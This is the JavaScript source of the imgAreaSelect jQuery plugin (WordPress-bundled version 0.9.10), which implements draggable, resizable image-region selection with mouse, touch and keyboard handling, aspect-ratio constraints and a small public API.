/*
 * imgAreaSelect jQuery plugin
 * version 0.9.10-wp-6.2
 *
 * Copyright (c) 2008-2013 Michal Wojciechowski (odyniec.net)
 *
 * Dual licensed under the MIT (MIT-LICENSE.txt)
 * and GPL (GPL-LICENSE.txt) licenses.
 *
 * https://github.com/odyniec/imgareaselect
 *
 */

(function($) {

/*
 * Math functions will be used extensively, so it's convenient to make a few
 * shortcuts
 */
var abs = Math.abs,
    max = Math.max,
    min = Math.min,
    floor = Math.floor;

/**
 * Create a new HTML div element
 *
 * @return A jQuery object representing the new element
 */
function div() {
    return $('<div/>');
}

/**
 * imgAreaSelect initialization
 *
 * @param img
 *            A HTML image element to attach the plugin to
 * @param options
 *            An options object
 */
$.imgAreaSelect = function (img, options) {
    var
        /* jQuery object representing the image */
        $img = $(img),

        /* Has the image finished loading? */
        imgLoaded,

        /* Plugin elements */

        /* Container box */
        $box = div(),
        /* Selection area */
        $area = div(),
        /* Border (four divs) */
        $border = div().add(div()).add(div()).add(div()),
        /* Outer area (four divs) */
        $outer = div().add(div()).add(div()).add(div()),
        /* Handles (empty by default, initialized in setOptions()) */
        $handles = $([]),

        /*
         * Additional element to work around a cursor problem in Opera
         * (explained later)
         */
        $areaOpera,

        /* Image position (relative to viewport) */
        left, top,

        /* Image offset (as returned by .offset()) */
        imgOfs = { left: 0, top: 0 },

        /* Image dimensions (as returned by .width() and .height()) */
        imgWidth, imgHeight,

        /*
         * jQuery object representing the parent element that the plugin
         * elements are appended to
         */
        $parent,

        /* Parent element offset (as returned by .offset()) */
        parOfs = { left: 0, top: 0 },

        /* Base z-index for plugin elements */
        zIndex = 0,

        /* Plugin elements position */
        position = 'absolute',

        /* X/Y coordinates of the starting point for move/resize operations */
        startX, startY,

        /* Horizontal and vertical scaling factors */
        scaleX, scaleY,

        /* Current resize mode ("nw", "se", etc.) */
        resize,

        /* Selection area constraints */
        minWidth, minHeight, maxWidth, maxHeight,

        /* Aspect ratio to maintain (floating point number) */
        aspectRatio,

        /* Are the plugin elements currently displayed? */
        shown,

        /* Current selection (relative to parent element) */
        x1, y1, x2, y2,

        /* Current selection (relative to scaled image) */
        selection = { x1: 0, y1: 0, x2: 0, y2: 0, width: 0, height: 0 },

        /* Document element */
        docElem = document.documentElement,

        /* User agent */
        ua = navigator.userAgent,

        /* Various helper variables used throughout the code */
        $p, d, i, o, w, h, adjusted;

    /*
     * Translate selection coordinates (relative to scaled image) to viewport
     * coordinates (relative to parent element)
     */

    /**
     * Translate selection X to viewport X
     *
     * @param x
     *            Selection X
     * @return Viewport X
     */
    function viewX(x) {
        return x + imgOfs.left - parOfs.left;
    }

    /**
     * Translate selection Y to viewport Y
     *
     * @param y
     *            Selection Y
     * @return Viewport Y
     */
    function viewY(y) {
        return y + imgOfs.top - parOfs.top;
    }

    /*
     * Translate viewport coordinates to selection coordinates
     */

    /**
     * Translate viewport X to selection X
     *
     * @param x
     *            Viewport X
     * @return Selection X
     */
    function selX(x) {
        return x - imgOfs.left + parOfs.left;
    }

    /**
     * Translate viewport Y to selection Y
     *
     * @param y
     *            Viewport Y
     * @return Selection Y
     */
    function selY(y) {
        return y - imgOfs.top + parOfs.top;
    }

    /*
     * Translate event coordinates (relative to document) to viewport
     * coordinates
     */

    /**
     * Get event X and translate it to viewport X
     *
     * @param event
     *            The event object
     * @return Viewport X
     */
    function evX(event) {
        return max(event.pageX || 0, touchCoords(event).x) - parOfs.left;
    }

    /**
     * Get event Y and translate it to viewport Y
     *
     * @param event
     *            The event object
     * @return Viewport Y
     */
    function evY(event) {
        return max(event.pageY || 0, touchCoords(event).y) - parOfs.top;
    }

    /**
     * Get X and Y coordinates of a touch event
     *
     * @param event
     *            The event object
     * @return Coordinates object
     */
    function touchCoords(event) {
        var oev = event.originalEvent || {};

        if (oev.touches && oev.touches.length)
            return { x: oev.touches[0].pageX, y: oev.touches[0].pageY };
        else
            return { x: 0, y: 0 };
    }

    /**
     * Get the current selection
     *
     * @param noScale
     *            If set to <code>true</code>, scaling is not applied to the
     *            returned selection
     * @return Selection object
     */
    function getSelection(noScale) {
        var sx = noScale || scaleX, sy = noScale || scaleY;

        return { x1: floor(selection.x1 * sx),
            y1: floor(selection.y1 * sy),
            x2: floor(selection.x2 * sx),
            y2: floor(selection.y2 * sy),
            width: floor(selection.x2 * sx) - floor(selection.x1 * sx),
            height: floor(selection.y2 * sy) - floor(selection.y1 * sy) };
    }

    /**
     * Set the current selection
     *
     * @param x1
     *            X coordinate of the upper left corner of the selection area
     * @param y1
     *            Y coordinate of the upper left corner of the selection area
     * @param x2
     *            X coordinate of the lower right corner of the selection area
     * @param y2
     *            Y coordinate of the lower right corner of the selection area
     * @param noScale
     *            If set to <code>true</code>, scaling is not applied to the
     *            new selection
     */
    function setSelection(x1, y1, x2, y2, noScale) {
        var sx = noScale || scaleX, sy = noScale || scaleY;

        selection = {
            x1: floor(x1 / sx || 0),
            y1: floor(y1 / sy || 0),
            x2: floor(x2 / sx || 0),
            y2: floor(y2 / sy || 0)
        };

        selection.width = selection.x2 - selection.x1;
        selection.height = selection.y2 - selection.y1;
    }

    /**
     * Recalculate image and parent offsets
     */
    function adjust() {
        /*
         * Do not adjust if image has not yet loaded or if width is not a
         * positive number. The latter might happen when imgAreaSelect is put
         * on a parent element which is then hidden.
         */
        if (!imgLoaded || !$img.width())
            return;

        /*
         * Get image offset. The .offset() method returns float values, so they
         * need to be rounded.
         */
        imgOfs = { left: floor($img.offset().left), top: floor($img.offset().top) };

        /* Get image dimensions */
        imgWidth = $img.innerWidth();
        imgHeight = $img.innerHeight();

        imgOfs.top += ($img.outerHeight() - imgHeight) >> 1;
        imgOfs.left += ($img.outerWidth() - imgWidth) >> 1;

        /* Set minimum and maximum selection area dimensions */
        minWidth = floor(options.minWidth / scaleX) || 0;
        minHeight = floor(options.minHeight / scaleY) || 0;
        maxWidth = floor(min(options.maxWidth / scaleX || 1<<24, imgWidth));
        maxHeight = floor(min(options.maxHeight / scaleY || 1<<24, imgHeight));

        /*
         * Workaround for jQuery 1.3.2 incorrect offset calculation, originally
         * observed in Safari 3. Firefox 2 is also affected.
         */
        if ($().jquery == '1.3.2' && position == 'fixed' &&
            !docElem['getBoundingClientRect'])
        {
            imgOfs.top += max(document.body.scrollTop, docElem.scrollTop);
            imgOfs.left += max(document.body.scrollLeft, docElem.scrollLeft);
        }

        /* Determine parent element offset */
        parOfs = /absolute|relative/.test($parent.css('position')) ?
            { left: floor($parent.offset().left) - $parent.scrollLeft(),
                top: floor($parent.offset().top) - $parent.scrollTop() } :
            position == 'fixed' ?
                { left: $(document).scrollLeft(), top: $(document).scrollTop() } :
                { left: 0, top: 0 };

        left = viewX(0);
        top = viewY(0);

        /*
         * Check if selection area is within image boundaries, adjust if
         * necessary
         */
        if (selection.x2 > imgWidth || selection.y2 > imgHeight)
            doResize();
    }

    /**
     * Update plugin elements
     *
     * @param resetKeyPress
     *            If set to <code>false</code>, this instance's keypress
     *            event handler is not activated
     */
    function update(resetKeyPress) {
        /* If plugin elements are hidden, do nothing */
        if (!shown) return;

        /*
         * Set the position and size of the container box and the selection area
         * inside it
         */
        $box.css({ left: viewX(selection.x1), top: viewY(selection.y1) })
            .add($area).width(w = selection.width).height(h = selection.height);

        /*
         * Reset the position of selection area, borders, and handles (IE6/IE7
         * position them incorrectly if we don't do this)
         */
        $area.add($border).add($handles).css({ left: 0, top: 0 });

        /* Set border dimensions */
        $border
            .width(max(w - $border.outerWidth() + $border.innerWidth(), 0))
            .height(max(h - $border.outerHeight() + $border.innerHeight(), 0));

        /* Arrange the outer area elements */
        $($outer[0]).css({ left: left, top: top,
            width: selection.x1, height: imgHeight });
        $($outer[1]).css({ left: left + selection.x1, top: top,
            width: w, height: selection.y1 });
        $($outer[2]).css({ left: left + selection.x2, top: top,
            width: imgWidth - selection.x2, height: imgHeight });
        $($outer[3]).css({ left: left + selection.x1, top: top + selection.y2,
            width: w, height: imgHeight - selection.y2 });

        w -= $handles.outerWidth();
        h -= $handles.outerHeight();

        /* Arrange handles */
        switch ($handles.length) {
        case 8:
            $($handles[4]).css({ left: w >> 1 });
            $($handles[5]).css({ left: w, top: h >> 1 });
            $($handles[6]).css({ left: w >> 1, top: h });
            $($handles[7]).css({ top: h >> 1 });
        case 4:
            $handles.slice(1,3).css({ left: w });
            $handles.slice(2,4).css({ top: h });
        }

        if (resetKeyPress !== false) {
            /*
             * Need to reset the document keypress event handler -- unbind the
             * current handler
             */
            if ($.imgAreaSelect.onKeyPress != docKeyPress)
                $(document).off($.imgAreaSelect.keyPress,
                    $.imgAreaSelect.onKeyPress);

            if (options.keys)
                /*
                 * Set the document keypress event handler to this instance's
                 * docKeyPress() function
                 */
                $(document).on( $.imgAreaSelect.keyPress, function() {
                    $.imgAreaSelect.onKeyPress = docKeyPress;
                });
        }

        /*
         * Internet Explorer displays 1px-wide dashed borders incorrectly by
         * filling the spaces between dashes with white. Toggling the margin
         * property between 0 and "auto" fixes this in IE6 and IE7 (IE8 is still
         * broken). This workaround is not perfect, as it requires setTimeout()
         * and thus causes the border to flicker a bit, but I haven't found a
         * better solution.
         *
         * Note: This only happens with CSS borders, set with the borderWidth,
         * borderOpacity, borderColor1, and borderColor2 options (which are now
         * deprecated). Borders created with GIF background images are fine.
         */
        if (msie && $border.outerWidth() - $border.innerWidth() == 2) {
            $border.css('margin', 0);
            setTimeout(function () { $border.css('margin', 'auto'); }, 0);
        }
    }

    /**
     * Do the complete update sequence: recalculate offsets, update the
     * elements, and set the correct values of x1, y1, x2, and y2.
     *
     * @param resetKeyPress
     *            If set to <code>false</code>, this instance's keypress
     *            event handler is not activated
     */
    function doUpdate(resetKeyPress) {
        adjust();
        update(resetKeyPress);
        updateSelectionRelativeToParentElement();
    }

    /**
     * Set the correct values of x1, y1, x2, and y2.
     */
    function updateSelectionRelativeToParentElement() {
        x1 = viewX(selection.x1); y1 = viewY(selection.y1);
        x2 = viewX(selection.x2); y2 = viewY(selection.y2);
    }

    /**
     * Hide or fade out an element (or multiple elements)
     *
     * @param $elem
     *            A jQuery object containing the element(s) to hide/fade out
     * @param fn
     *            Callback function to be called when fadeOut() completes
     */
    function hide($elem, fn) {
        options.fadeSpeed ? $elem.fadeOut(options.fadeSpeed, fn) : $elem.hide();
    }

    /**
     * Selection area mousemove event handler
     *
     * @param event
     *            The event object
     */
    function areaMouseMove(event) {
        var x = selX(evX(event)) - selection.x1,
            y = selY(evY(event)) - selection.y1;

        if (!adjusted) {
            adjust();
            adjusted = true;

            $box.one('mouseout', function () { adjusted = false; });
        }

        /* Clear the resize mode */
        resize = '';

        if (options.resizable) {
            /*
             * Check if the mouse pointer is over the resize margin area and set
             * the resize mode accordingly
             */
            if (y <= options.resizeMargin)
                resize = 'n';
            else if (y >= selection.height - options.resizeMargin)
                resize = 's';
            if (x <= options.resizeMargin)
                resize += 'w';
            else if (x >= selection.width - options.resizeMargin)
                resize += 'e';
        }

        $box.css('cursor', resize ? resize + '-resize' :
            options.movable ? 'move' : '');
        if ($areaOpera)
            $areaOpera.toggle();
    }

    /**
     * Document mouseup event handler
     *
     * @param event
     *            The event object
     */
    function docMouseUp(event) {
        /* Set back the default cursor */
        $('body').css('cursor', '');
        /*
         * If autoHide is enabled, or if the selection has zero width/height,
         * hide the selection and the outer area
         */
        if (options.autoHide || selection.width * selection.height == 0)
            hide($box.add($outer), function () { $(this).hide(); });

        $(document).off('mousemove touchmove', selectingMouseMove);
        $box.on('mousemove touchmove', areaMouseMove);

        options.onSelectEnd(img, getSelection());
    }

    /**
     * Selection area mousedown event handler
     *
     * @param event
     *            The event object
     * @return false
     */
    function areaMouseDown(event) {
        if (event.type == 'mousedown' && event.which != 1) return false;

    	/*
    	 * With mobile browsers, there is no "moving the pointer over" action,
    	 * so we need to simulate one mousemove event happening prior to
    	 * mousedown/touchstart.
    	 */
    	areaMouseMove(event);

        adjust();

        if (resize) {
            /* Resize mode is in effect */
            $('body').css('cursor', resize + '-resize');

            x1 = viewX(selection[/w/.test(resize) ? 'x2' : 'x1']);
            y1 = viewY(selection[/n/.test(resize) ? 'y2' : 'y1']);

            $(document).on('mousemove touchmove', selectingMouseMove)
                .one('mouseup touchend', docMouseUp);
            $box.off('mousemove touchmove', areaMouseMove);
        }
        else if (options.movable) {
            startX = left + selection.x1 - evX(event);
            startY = top + selection.y1 - evY(event);

            $box.off('mousemove touchmove', areaMouseMove);

            $(document).on('mousemove touchmove', movingMouseMove)
                .one('mouseup touchend', function () {
                    options.onSelectEnd(img, getSelection());

                    $(document).off('mousemove touchmove', movingMouseMove);
                    $box.on('mousemove touchmove', areaMouseMove);
                });
        }
        else
            $img.mousedown(event);

        return false;
    }

    /**
     * Adjust the x2/y2 coordinates to maintain aspect ratio (if defined)
     *
     * @param xFirst
     *            If set to <code>true</code>, calculate x2 first. Otherwise,
     *            calculate y2 first.
     */
    function fixAspectRatio(xFirst) {
        if (aspectRatio)
            if (xFirst) {
                x2 = max(left, min(left + imgWidth,
                    x1 + abs(y2 - y1) * aspectRatio * (x2 > x1 || -1)));
                y2 = floor(max(top, min(top + imgHeight,
                    y1 + abs(x2 - x1) / aspectRatio * (y2 > y1 || -1))));
                x2 = floor(x2);
            }
            else {
                y2 = max(top, min(top + imgHeight,
                    y1 + abs(x2 - x1) / aspectRatio * (y2 > y1 || -1)));
                x2 = floor(max(left, min(left + imgWidth,
                    x1 + abs(y2 - y1) * aspectRatio * (x2 > x1 || -1))));
                y2 = floor(y2);
            }
    }

    /**
     * Resize the selection area respecting the minimum/maximum dimensions and
     * aspect ratio
     */
    function doResize() {
        /*
         * Make sure x1, x2, y1, y2 are initialized to avoid the following calculation
         * getting incorrect results.
         */
        if ( x1 == null || x2 == null || y1 == null || y2 == null ) {
            updateSelectionRelativeToParentElement();
        }

        /*
         * Make sure the top left corner of the selection area stays within
         * image boundaries (it might not if the image source was dynamically
         * changed).
         */
        x1 = min(x1, left + imgWidth);
        y1 = min(y1, top + imgHeight);

        if (abs(x2 - x1) < minWidth) {
            /* Selection width is smaller than minWidth */
            x2 = x1 - minWidth * (x2 < x1 || -1);

            if (x2 < left)
                x1 = left + minWidth;
            else if (x2 > left + imgWidth)
                x1 = left + imgWidth - minWidth;
        }

        if (abs(y2 - y1) < minHeight) {
            /* Selection height is smaller than minHeight */
            y2 = y1 - minHeight * (y2 < y1 || -1);

            if (y2 < top)
                y1 = top + minHeight;
            else if (y2 > top + imgHeight)
                y1 = top + imgHeight - minHeight;
        }

        x2 = max(left, min(x2, left + imgWidth));
        y2 = max(top, min(y2, top + imgHeight));

        fixAspectRatio(abs(x2 - x1) < abs(y2 - y1) * aspectRatio);

        if (abs(x2 - x1) > maxWidth) {
            /* Selection width is greater than maxWidth */
            x2 = x1 - maxWidth * (x2 < x1 || -1);
            fixAspectRatio();
        }

        if (abs(y2 - y1) > maxHeight) {
            /* Selection height is greater than maxHeight */
            y2 = y1 - maxHeight * (y2 < y1 || -1);
            fixAspectRatio(true);
        }

        selection = { x1: selX(min(x1, x2)), x2: selX(max(x1, x2)),
            y1: selY(min(y1, y2)), y2: selY(max(y1, y2)),
            width: abs(x2 - x1), height: abs(y2 - y1) };

        update();

        options.onSelectChange(img, getSelection());
    }

    /**
     * Mousemove event handler triggered when the user is selecting an area
     *
     * @param event
     *            The event object
     * @return false
     */
    function selectingMouseMove(event) {
        x2 = /w|e|^$/.test(resize) || aspectRatio ? evX(event) : viewX(selection.x2);
        y2 = /n|s|^$/.test(resize) || aspectRatio ? evY(event) : viewY(selection.y2);

        doResize();

        return false;
    }

    /**
     * Move the selection area
     *
     * @param newX1
     *            New viewport X1
     * @param newY1
     *            New viewport Y1
     */
    function doMove(newX1, newY1) {
        x2 = (x1 = newX1) + selection.width;
        y2 = (y1 = newY1) + selection.height;

        $.extend(selection, { x1: selX(x1), y1: selY(y1), x2: selX(x2),
            y2: selY(y2) });

        update();

        options.onSelectChange(img, getSelection());
    }

    /**
     * Mousemove event handler triggered when the selection area is being moved
     *
     * @param event
     *            The event object
     * @return false
     */
    function movingMouseMove(event) {
        x1 = max(left, min(startX + evX(event), left + imgWidth - selection.width));
        y1 = max(top, min(startY + evY(event), top + imgHeight - selection.height));

        doMove(x1, y1);

        event.preventDefault();
        return false;
    }

    /**
     * Start selection
     */
    function startSelection() {
        $(document).off('mousemove touchmove', startSelection);
        adjust();

        x2 = x1;
        y2 = y1;
        doResize();

        resize = '';

        if (!$outer.is(':visible'))
            /* Show the plugin elements */
            $box.add($outer).hide().fadeIn(options.fadeSpeed||0);

        shown = true;

        $(document).off('mouseup touchend', cancelSelection)
            .on('mousemove touchmove', selectingMouseMove)
            .one('mouseup touchend', docMouseUp);
        $box.off('mousemove touchmove', areaMouseMove);

        options.onSelectStart(img, getSelection());
    }

    /**
     * Cancel selection
     */
    function cancelSelection() {
        $(document).off('mousemove touchmove', startSelection)
            .off('mouseup touchend', cancelSelection);
        hide($box.add($outer));

        setSelection(selX(x1), selY(y1), selX(x1), selY(y1));

        /* If this is an API call, callback functions should not be triggered */
        if (!(this instanceof $.imgAreaSelect)) {
            options.onSelectChange(img, getSelection());
            options.onSelectEnd(img, getSelection());
        }
    }

    /**
     * Image mousedown event handler
     *
     * @param event
     *            The event object
     * @return false
     */
    function imgMouseDown(event) {
        /* Ignore the event if animation is in progress */
        if (event.which > 1 || $outer.is(':animated')) return false;

        adjust();
        startX = x1 = evX(event);
        startY = y1 = evY(event);

        /* Selection will start when the mouse is moved */
        $(document).on({ 'mousemove touchmove': startSelection,
            'mouseup touchend': cancelSelection });

        return false;
    }

    /**
     * Window resize event handler
     */
    function windowResize() {
        doUpdate(false);
    }

    /**
     * Image load event handler. This is the final part of the initialization
     * process.
     */
    function imgLoad() {
        imgLoaded = true;

        /* Set options */
        setOptions(options = $.extend({
            classPrefix: 'imgareaselect',
            movable: true,
            parent: 'body',
            resizable: true,
            resizeMargin: 10,
            onInit: function () {},
            onSelectStart: function () {},
            onSelectChange: function () {},
            onSelectEnd: function () {}
        }, options));

        $box.add($outer).css({ visibility: '' });

        if (options.show) {
            shown = true;
            adjust();
            update();
            $box.add($outer).hide().fadeIn(options.fadeSpeed||0);
        }

        /*
         * Call the onInit callback. The setTimeout() call is used to ensure
         * that the plugin has been fully initialized and the object instance is
         * available (so that it can be obtained in the callback).
         */
        setTimeout(function () { options.onInit(img, getSelection()); }, 0);
    }

    /**
     * Document keypress event handler
     *
     * @param event
     *            The event object
     * @return false
     */
    var docKeyPress = function(event) {
        var k = options.keys, d, t, key = event.keyCode;

        d = !isNaN(k.alt) && (event.altKey || event.originalEvent.altKey) ? k.alt :
            !isNaN(k.ctrl) && event.ctrlKey ? k.ctrl :
            !isNaN(k.shift) && event.shiftKey ? k.shift :
            !isNaN(k.arrows) ? k.arrows : 10;

        if (k.arrows == 'resize' || (k.shift == 'resize' && event.shiftKey) ||
            (k.ctrl == 'resize' && event.ctrlKey) ||
            (k.alt == 'resize' && (event.altKey || event.originalEvent.altKey)))
        {
            /* Resize selection */

            switch (key) {
            case 37:
                /* Left */
                d = -d;
            case 39:
                /* Right */
                t = max(x1, x2);
                x1 = min(x1, x2);
                x2 = max(t + d, x1);
                fixAspectRatio();
                break;
            case 38:
                /* Up */
                d = -d;
            case 40:
                /* Down */
                t = max(y1, y2);
                y1 = min(y1, y2);
                y2 = max(t + d, y1);
                fixAspectRatio(true);
                break;
            default:
                return;
            }

            doResize();
        }
        else {
            /* Move selection */

            x1 = min(x1, x2);
            y1 = min(y1, y2);

            switch (key) {
            case 37:
                /* Left */
                doMove(max(x1 - d, left), y1);
                break;
            case 38:
                /* Up */
                doMove(x1, max(y1 - d, top));
                break;
            case 39:
                /* Right */
                doMove(x1 + min(d, imgWidth - selX(x2)), y1);
                break;
            case 40:
                /* Down */
                doMove(x1, y1 + min(d, imgHeight - selY(y2)));
                break;
            default:
                return;
            }
        }

        return false;
    };

    /**
     * Apply style options to plugin element (or multiple elements)
     *
     * @param $elem
     *            A jQuery object representing the element(s) to style
     * @param props
     *            An object that maps option names to corresponding CSS
     *            properties
     */
    function styleOptions($elem, props) {
        for (var option in props)
            if (options[option] !== undefined)
                $elem.css(props[option], options[option]);
    }

    /**
     * Set plugin options
     *
     * @param newOptions
     *            The new options object
     */
    function setOptions(newOptions) {
        if (newOptions.parent)
            ($parent = $(newOptions.parent)).append($box.add($outer));

        /* Merge the new options with the existing ones */
        $.extend(options, newOptions);

        adjust();

        if (newOptions.handles != null) {
            /* Recreate selection area handles */
            $handles.remove();
            $handles = $([]);

            i = newOptions.handles ? newOptions.handles == 'corners' ? 4 : 8 : 0;

            while (i--)
                $handles = $handles.add(div());

            /* Add a class to handles and set the CSS properties */
            $handles.addClass(options.classPrefix + '-handle').css({
                position: 'absolute',
                /*
                 * The font-size property needs to be set to zero, otherwise
                 * Internet Explorer makes the handles too large
                 */
                fontSize: '0',
                zIndex: zIndex + 1 || 1
            });

            /*
             * If handle width/height has not been set with CSS rules, set the
             * default 5px
             */
            if (!parseInt($handles.css('width')) >= 0)
                $handles.width(10).height(10);

            /*
             * If the borderWidth option is in use, add a solid border to
             * handles
             */
            if (o = options.borderWidth)
                $handles.css({ borderWidth: o, borderStyle: 'solid' });

            /* Apply other style options */
            styleOptions($handles, { borderColor1: 'border-color',
                borderColor2: 'background-color',
                borderOpacity: 'opacity' });
        }

        /* Calculate scale factors */
        scaleX = options.imageWidth / imgWidth || 1;
        scaleY = options.imageHeight / imgHeight || 1;

        /* Set selection */
        if (newOptions.x1 != null) {
            setSelection(newOptions.x1, newOptions.y1, newOptions.x2,
                newOptions.y2);
            newOptions.show = !newOptions.hide;
        }

        if (newOptions.keys)
            /* Enable keyboard support */
            options.keys = $.extend({ shift: 1, ctrl: 'resize' },
                newOptions.keys);

        /* Add classes to plugin elements */
        $outer.addClass(options.classPrefix + '-outer');
        $area.addClass(options.classPrefix + '-selection');
        for (i = 0; i++ < 4;)
            $($border[i-1]).addClass(options.classPrefix + '-border' + i);

        /* Apply style options */
        styleOptions($area, { selectionColor: 'background-color',
            selectionOpacity: 'opacity' });
        styleOptions($border, { borderOpacity: 'opacity',
            borderWidth: 'border-width' });
        styleOptions($outer, { outerColor: 'background-color',
            outerOpacity: 'opacity' });
        if (o = options.borderColor1)
            $($border[0]).css({ borderStyle: 'solid', borderColor: o });
        if (o = options.borderColor2)
            $($border[1]).css({ borderStyle: 'dashed', borderColor: o });

        /* Append all the selection area elements to the container box */
        $box.append($area.add($border).add($areaOpera)).append($handles);

        if (msie) {
            if (o = ($outer.css('filter')||'').match(/opacity=(\d+)/))
                $outer.css('opacity', o[1]/100);
            if (o = ($border.css('filter')||'').match(/opacity=(\d+)/))
                $border.css('opacity', o[1]/100);
        }

        if (newOptions.hide)
            hide($box.add($outer));
        else if (newOptions.show && imgLoaded) {
            shown = true;
            $box.add($outer).fadeIn(options.fadeSpeed||0);
            doUpdate();
        }

        /* Calculate the aspect ratio factor */
        aspectRatio = (d = (options.aspectRatio || '').split(/:/))[0] / d[1];

        $img.add($outer).off('mousedown', imgMouseDown);

        if (options.disable || options.enable === false) {
            /* Disable the plugin */
            $box.off({ 'mousemove touchmove': areaMouseMove,
                'mousedown touchstart': areaMouseDown });
            $(window).off('resize', windowResize);
        }
        else {
            if (options.enable || options.disable === false) {
                /* Enable the plugin */
                if (options.resizable || options.movable)
                    $box.on({ 'mousemove touchmove': areaMouseMove,
                        'mousedown touchstart': areaMouseDown });

                $(window).on( 'resize', windowResize);
            }

            if (!options.persistent)
                $img.add($outer).on('mousedown touchstart', imgMouseDown);
        }

        options.enable = options.disable = undefined;
    }

    /**
     * Remove plugin completely
     */
    this.remove = function () {
        /*
         * Call setOptions with { disable: true } to unbind the event handlers
         */
        setOptions({ disable: true });
        $box.add($outer).remove();
    };

    /*
     * Public API
     */

    /**
     * Get current options
     *
     * @return An object containing the set of options currently in use
     */
    this.getOptions = function () { return options; };

    /**
     * Set plugin options
     *
     * @param newOptions
     *            The new options object
     */
    this.setOptions = setOptions;

    /**
     * Get the current selection
     *
     * @param noScale
     *            If set to <code>true</code>, scaling is not applied to the
     *            returned selection
     * @return Selection object
     */
    this.getSelection = getSelection;

    /**
     * Set the current selection
     *
     * @param x1
     *            X coordinate of the upper left corner of the selection area
     * @param y1
     *            Y coordinate of the upper left corner of the selection area
     * @param x2
     *            X coordinate of the lower right corner of the selection area
     * @param y2
     *            Y coordinate of the lower right corner of the selection area
     * @param noScale
     *            If set to <code>true</code>, scaling is not applied to the
     *            new selection
     */
    this.setSelection = setSelection;

    /**
     * Cancel selection
     */
    this.cancelSelection = cancelSelection;

    /**
     * Update plugin elements
     *
     * @param resetKeyPress
     *            If set to <code>false</code>, this instance's keypress
     *            event handler is not activated
     */
    this.update = doUpdate;

    /* Do the dreaded browser detection */
    var msie = (/msie ([\w.]+)/i.exec(ua)||[])[1],
        opera = /opera/i.test(ua),
        safari = /webkit/i.test(ua) && !/chrome/i.test(ua);

    /*
     * Traverse the image's parent elements (up to <body>) and find the
     * highest z-index
     */
    $p = $img;

    while ($p.length) {
        zIndex = max(zIndex,
            !isNaN($p.css('z-index')) ? $p.css('z-index') : zIndex);
        /* Also check if any of the ancestor elements has fixed position */
        if ($p.css('position') == 'fixed')
            position = 'fixed';

        $p = $p.parent(':not(body)');
    }

    /*
     * If z-index is given as an option, it overrides the one found by the
     * above loop
     */
    zIndex = options.zIndex || zIndex;

    if (msie)
        $img.attr('unselectable', 'on');

    /*
     * In MSIE and WebKit, we need to use the keydown event instead of keypress
     */
    $.imgAreaSelect.keyPress = msie || safari ? 'keydown' : 'keypress';

    /*
     * There is a bug affecting the CSS cursor property in Opera (observed in
     * versions up to 10.00) that prevents the cursor from being updated unless
     * the mouse leaves and enters the element again. To trigger the mouseover
     * event, we're adding an additional div to $box and we're going to toggle
     * it when mouse moves inside the selection area.
     */
    if (opera)
        $areaOpera = div().css({ width: '100%', height: '100%',
            position: 'absolute', zIndex: zIndex + 2 || 2 });

    /*
     * We initially set visibility to "hidden" as a workaround for a weird
     * behaviour observed in Google Chrome 1.0.154.53 (on Windows XP). Normally
     * we would just set display to "none", but, for some reason, if we do so
     * then Chrome refuses to later display the element with .show() or
     * .fadeIn().
     */
    $box.add($outer).css({ visibility: 'hidden', position: position,
        overflow: 'hidden', zIndex: zIndex || '0' });
    $box.css({ zIndex: zIndex + 2 || 2 });
    $area.add($border).css({ position: 'absolute', fontSize: '0' });

    /*
     * If the image has been fully loaded, or if it is not really an image (eg.
     * a div), call imgLoad() immediately; otherwise, bind it to be called once
     * on image load event.
     */
    img.complete || img.readyState == 'complete' || !$img.is('img') ?
        imgLoad() : $img.one('load', imgLoad);

    /*
     * MSIE 9.0 doesn't always fire the image load event -- resetting the src
     * attribute seems to trigger it. The check is for version 7 and above to
     * accommodate for MSIE 9 running in compatibility mode.
     */
    if (!imgLoaded && msie && msie >= 7)
        img.src = img.src;
};

/**
 * Invoke imgAreaSelect on a jQuery object containing the image(s)
 *
 * @param options
 *            Options object
 * @return The jQuery object or a reference to imgAreaSelect instance (if the
 *         <code>instance</code> option was specified)
 */
$.fn.imgAreaSelect = function (options) {
    options = options || {};

    this.each(function () {
        /* Is there already an imgAreaSelect instance bound to this element? */
        if ($(this).data('imgAreaSelect')) {
            /* Yes there is -- is it supposed to be removed? */
            if (options.remove) {
                /* Remove the plugin */
                $(this).data('imgAreaSelect').remove();
                $(this).removeData('imgAreaSelect');
            }
            else
                /* Reset options */
                $(this).data('imgAreaSelect').setOptions(options);
        }
        else if (!options.remove) {
            /* No exising instance -- create a new one */

            /*
             * If neither the "enable" nor the "disable" option is present, add
             * "enable" as the default
             */
            if (options.enable === undefined && options.disable === undefined)
                options.enable = true;

            $(this).data('imgAreaSelect', new $.imgAreaSelect(this, options));
        }
    });

    if (options.instance)
        /*
         * Return the imgAreaSelect instance bound to the first element in the
         * set
         */
        return $(this).data('imgAreaSelect');

    return this;
};

})(jQuery);
